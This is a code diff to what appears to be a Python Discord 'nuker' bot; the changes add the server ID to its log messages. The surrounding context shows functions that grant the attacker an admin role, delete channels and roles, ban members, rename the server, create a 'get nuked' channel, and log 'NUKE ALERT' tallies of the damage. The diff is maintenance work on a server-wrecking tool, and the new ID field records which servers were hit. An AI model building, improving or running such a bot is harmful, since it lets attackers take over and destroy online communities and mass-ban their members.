@@ -158,6 +158,7 @@ async def create_admin(ctx):
 *** ADMIN ALERT ***
 Gave {ctx.message.author} the admin role.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -165,6 +166,7 @@ Server Owner: {ctx.guild.owner}
         output_log(f'''
 Failed to create/grant administrator role: insufficient permissions.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -180,6 +182,7 @@ async def delete_channels(ctx):
                     output_log(f'''
 Failed to delete channel "{channel.name}": insufficient permissions.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -192,6 +195,7 @@ async def create_nuke_channel(ctx, name):
         output_log(f'''
 Failed to create the "get nuked" channel: insufficient permissions.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -217,6 +221,7 @@ async def edit_server(ctx, name, icon_file):
         output_log(f'''
 Failed to edit the server's icon and name: insufficient permissions.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -232,6 +237,7 @@ async def ban_members(ctx, member_list):
             output_log(f'''
 Failed to ban user "{member}": insufficient permissions.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -245,6 +251,7 @@ async def delete_roles(ctx, role_list):
             output_log(f'''
 Failed to delete role "{role.name}": insufficient permissions.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -273,6 +280,7 @@ async def on_guild_join(guild):
 => SERVER JOIN ALERT <=
 {bot.user} has joined the server.
 Server Name: {guild.name}
+Server ID: {guild.id}
 Server Owner: {guild.owner}
 ''')
 
@@ -284,6 +292,7 @@ async def on_guild_leave(guild):
 => SERVER LEAVE ALERT <=
 {bot.user} has left the server.
 Server Name: {guild.name}
+Server ID: {guild.id}
 Server Owner: {guild.owner}
 ''')
 
@@ -374,6 +383,7 @@ async def nuke(ctx):
     output_log(f'''
 *** NUKE ALERT ***
 Server Name: {server_name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 Banned Users: {len(member_list)}
 Roles Deleted: {len(role_list)}
@@ -399,6 +409,7 @@ async def pause(ctx):
 *** NUKER BAN ALERT ***
 Nuker ({await bot.fetch_user(ctx.message.author.id)}) has been banned from the server!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
     else:
@@ -407,6 +418,7 @@ Server Owner: {ctx.guild.owner}
 *** NUKER BAN ALERT ***
 Nuker ({await ctx.guild.fetch_member(USER_ID)}) has been banned from the server!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -422,6 +434,7 @@ async def stop(ctx):
 *** NUKER CLEANUP ALERT ***
 {ctx.message.author.name} has been banned from the server and the bot has been removed!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
     else:
@@ -430,6 +443,7 @@ Server Owner: {ctx.guild.owner}
 *** NUKER CLEANUP ALERT ***
 {await ctx.guild.fetch_member(USER_ID)} has been banned from the server and the bot has been removed!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -444,6 +458,7 @@ async def leave(ctx):
 *** SERVER LEAVE ALERT ***
 {bot.user} has left the server.
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -675,6 +690,7 @@ __**Error: Missing Required Permission!**__
         output_log(f'''
 Bad Environment: Insufficient Permissions!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -700,6 +716,7 @@ __**Error: Missing Required Permission!**__
         output_log(f'''
 Bad Environment: Insufficient Permissions!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -725,6 +742,7 @@ __**Error: Missing Required Permission!**__
         output_log(f'''
 Bad Environment: Insufficient Permissions!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -750,6 +768,7 @@ __**Error: Missing Required Permission!**__
         output_log(f'''
 Bad Environment: Insufficient Permissions!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -775,6 +794,7 @@ __**Error: Missing Required Permission!**__
         output_log(f'''
 Bad Environment: Insufficient Permissions!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
@@ -800,6 +820,7 @@ __**Error: Missing Required Permission!**__
         output_log(f'''
 Bad Environment: Insufficient Permissions!
 Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
